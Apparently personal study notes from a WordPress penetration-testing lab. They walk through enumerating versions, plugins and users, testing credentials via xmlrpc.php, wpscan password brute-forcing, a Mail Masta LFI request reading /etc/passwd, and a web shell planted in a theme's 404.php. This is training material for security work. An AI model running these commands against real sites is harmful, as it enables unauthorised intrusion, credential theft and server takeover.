# Hacking WordPress

## Intro 

wordpress is the most popular open source CMS and powers nealry one-third of all websites in the world   
can be used for things like hosting blogs, forums, e-commerce, project management, document management and much more   
customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins   
written in PHP and usually runs on Apache with MySQL as backend 

### What is a CMS 

a CMS is a powerful tool that helps build a website without needing to code everything from scratch   
can edit sites as if working in a word processor and users can upload media directly from a media library interface instead of interacting with the webserver either through a management portal or via FTP or SFTP   

a CMS is made up of two key components
- a content management application (CMA) = interface used to add and manage content 
- content delivery application (CDA) = backend that takes the input entered into the CMA and assembles the code into a working site 

## WordPress Structure 

### Default wordpress file structure 

wordpress can be installed on windows, linux, or mac but we will focus on ubuntu linux web server   
requires a fully installed and configured LAMP stack (linux, apache http server, mysql db, and PHP)   
after installation all supporting files and directories will be accessible in the webroot located in `/var/www/html`

can view the directory structure of a default WordPress install showing the key files and subdirectories necessary for the site to function: 

`tree -L 1 /var/www/html`

![](Images/Pasted%20image%2020240311124814.png)

### Key wordpress files 

some of the files needed to configure wordpress to function properly are: 
- `index.php` homepage of wordpress 
- `license.txt` contains useful info such as version of wordpress installed
- `wp-activate.php` used for email activation process when setting up a new wordpress site
- `wp-admin` folder contains the login page for admin access and the backend dashboard. Once a user is logged in they can make changes to the site based on their assigned permissions. Login page can be located in: 
	- `/wp-admin/login.php`
	- `/wp-admin/wp-login.php`
	- `/login.php`
	- `/wp-login.php`

the login file can also be renamed which will make it more difficult to find the login page

`xmlrpc.php` is a file representing a feature that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism, this type of communication can be replaced by the wordpress REST API 

### WordPress configuration file 

`wp-config.php` file contains info required by wordpress to connect to the database like the database name, database host, username and password, authentication keys and salts, and database table prefix    
can also be used to activate DEBUG mode which is useful for troubleshooting 

![](Images/Pasted%20image%2020240311125844.png)

### Key wordpress directories 

`wp-content` folder is the main directory where plugins and themes are stored   
`uploads` is usually where any files uploaded to the platform are stored  
these files and directores could contain sensitive into that could lead to RCE or exploitation of other vulnerabilities or misconfigs 

`tree -L 1 /var/www/html/wp-content`

![](Images/Pasted%20image%2020240311130252.png)

`wp-includes` contains everything except for the admin components and the themes that belong to the site   
core files are stored here such as certificates, fonts, JS, and widgets 

`tree -L 1 /var/www/html/wp-includes` 

![](Images/Pasted%20image%2020240311130412.png)

## WordPress User Roles 

there are five types of users in standard wordpress installation: 
- `Administrator` - the user has access to admin features within the site, this includes adding and deleting users and posts as well as editing source code 
- `Editor` - can publish and manage posts, including the posts of other users 
- `Author` - can publish and manage their own posts 
- `Contributor` - can write and manage their own posts but cannot publish them 
- `Subscriber` - normal users who can browse posts and edit their profiles 

gaining admin access is usually needed to obtain code execution on the server but editors and authors might have access to certain vulnerable plugins that normal users dont 

## WordPress Core Version Enumeration 

important part of the enumeration phase is finding the software version number   
this can be helpful for looking for common misconfigs like default passwords for certain versions of an app and searching for known vulnerabilities for a particular version number 

many ways to find the version number, first and easiest way is the look at the page source code; we can do this simply by right clicking and looking at the source   
we can search for the `meta generator` tag either with ctrl+F or make a curl request with grep 

```html
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
```

`curl -s -X GET http://blog.inlanefreight.com | grep '<meta name=generator"'`

the source code may also contain comments that may be useful  
links to CSS and JS can also provide hints about the version number 

```html
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
```

```html
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
```

in older versions of wordpress another way to find the version info is in the `readme.html` file in the root directory 

## Plugins and Themes Enumeration 

can also find info about the installed plugins by looking at the source code or curl+grep 

```shell
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

![](Images/Pasted%20image%2020240311140101.png)

```shell
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

![](Images/Pasted%20image%2020240311140136.png)

the response headers may also contain version numbers for specific plugins 

not all installed plugins and themes can be discovered passively, and we will need to send requests to the server actively to enumerate them   
we can send GET requests that point to a directory or file that may exist on the server; if it does exist then we can gain access to it or receive a redirect indicating that the content does exist but we will not have direct access to it 

```shell
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
```

```shell
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
```

to speed up enumeration we could also write a bash script or use a tool like wfuzz or WPScan 

## Directory Indexing 

active plugins should not be our only focus because even deactivated plugins may still be accessible which would give us access to its associated scripts and functions   
deactivating a vulnerable plugin does not improve security and it is best practice to either remove them or keep them up to date 

if we have a disabled plugin: 

![](Images/Pasted%20image%2020240311141255.png)

we can still have access to it by browsing to the plugins directory:

![](Images/Pasted%20image%2020240311141421.png)

we can also view the directory listing using a curl command and convert the HTML output to a readable format with html2text: 

```shell
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```

![](Images/Pasted%20image%2020240311141642.png)

this is called directory indexing and allows us to navigate the folder and access files that may contain sensitive info or vulnerable code   
best practice to disable directory indexing on web servers so potential attackers can't gain direct access to any files or folders other than those necessary for the site to function properly 

we can start enumeration by sending a curl request to the page and then looking for any plugins or themes: 

![](Images/Pasted%20image%2020240311143226.png)

looking through each of these plugin folders you can enumerate and find the flag file: 

![](Images/Pasted%20image%2020240311170026.png)

## User Enumeration 

a critical phase of wordpress security assessments is enumerating a list of valid users   
with this list we might be able to guess default credentials or perform a brute force password attack   
if successful we might be able to login as an author or even an admin which can be leveraged to modify the site or interact with the underlying web server 

there are two methods for performing manual username enumeration 

### First method 

we can review posts to uncover the ID assigned to the user and their corresponding username   

if you hover over the link to the post author you can see the link to the user's account: 

![](Images/Pasted%20image%2020240311184926.png)

admins user IDs are usually `1` and we can confirm this by using the user ID for the `author` parameter in the url: 

`http://blog.inlanefrieight.com/?author=1`

if we use the following curl command we can look for the `Location` header to verify that the user ID does belong to a user

```shell
curl -s -I -X GET http://blog.inlanefreight.com/?author=1
```

![](Images/Pasted%20image%2020240311185115.png)

### Second method

the second method requires an interaction with the JSON endpoint that lets us obtain a list of users  
this has changed after wordpress core version 4.7.1 and later versions only show whether a user is configured or not  

```shell
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```

![](Images/Pasted%20image%2020240311185532.png)

## Login 

with a valid list of users we can then use a password brute forcing attack to attempt to gain access to the wordpress backend   
the attack can be performed via the login page or the `xmlrpc.php` page   

```shell
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

if our request contains valid credentials we would see something like: 

![](Images/Pasted%20image%2020240312161316.png)

if not we would see a 403 forbidden: 

![](Images/Pasted%20image%2020240312161344.png)

we can see how many method calls we can use on our target by using the `system.listMethods` method: 

`curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php`

![](Images/Pasted%20image%2020240312161825.png)

## WPScan Overview 

wpscan is an automated wordpress scanner and enumeration tool that determines if the themes and plugins used by wordpress are outdated and vulnerable   

can be installed with `gem install wpscan`

there are various enumeration options that can be specified like vulnerable plugins, all plugins, user enumeration, etc.   

it can pull vulnerability info from external sources to enhance our scans   
we can get an API token from WPVulnDB which is used by wpscan to look for vulnerability and exploit proof of concepts and reports   
after creating an account you can supply the token using `--api-token`; up to 50 free requests per day   

## WPScan Enumeration 

the `--enumerate` flag enumerates various components like plugins, themes, and users   
by default it will enumerate plugins, themes, users, media, and backups but arguments can be used to restrict enumeration to specific components 

can enumerate all plugins with `--enumerate ap` 

default number of threads is 5 but can be changed with `-t` 

```shell
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

![](Images/Pasted%20image%2020240312163828.png)

remember that wpscan will use various passive and active methods to determine versions and vulnerabilities 

## Exploiting a Vulnerable Plugin 

with the use of an API key we can see things like if the site uses an older version of wordpress, outdated themes, vulnerable plugins, etc.   

![](Images/Pasted%20image%2020240312165414.png)

we can see that the version of mail masta is vulnerable to SQLi and LFI so lets try to exploit it using the method shown: 

![](Images/Pasted%20image%2020240312165508.png)

we can look at the provided references like in exploit-db to see proof of concepts: 

![](Images/Pasted%20image%2020240312165628.png)

which we can replicate in our app: 

```shell
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

![](Images/Pasted%20image%2020240312165722.png)

## Attacking WordPress Users

wpscan can also bruteforce usernames and passwords, and it uses two kinds of login attacks `xmlrpc` and `wp-login`   
`wp-login` will try with the normal wordpress login page and `xmlrpc` will use the wordpress API to make login attempts through `/xmlrpc.php`   
the `xml-rpc` method is preferred because it is faster 

```shell
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

## Remote Code Execution (RCE) Via the Theme Editor 

with admin access to wordpress we can modify the PHP source code to execute system commands   

when we login with admin credentials we can get access to the admin panel where we can edit the appearance using the theme editor: 

![](Images/Pasted%20image%2020240313131517.png)

this lets us edit the PHP source code directly but we should choose and inactive theme in order to avoid corrupting the main theme 

we can see that the theme is transportex so we can select an unused theme like twenty seventeen: 

![](Images/Pasted%20image%2020240313131710.png)

![](Images/Pasted%20image%2020240313131744.png)

we can then choose a non-critical theme file like the 404 page to upload a web shell: 

![](Images/Pasted%20image%2020240313131921.png)

![](Images/Pasted%20image%2020240313132005.png)

then after uploading the file we can send a request to it with our `cmd` parameter to execute our commands:

```shell
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

![](Images/Pasted%20image%2020240313132130.png)

![](Images/Pasted%20image%2020240313132620.png)

## Attacking WordPress With Metasploit

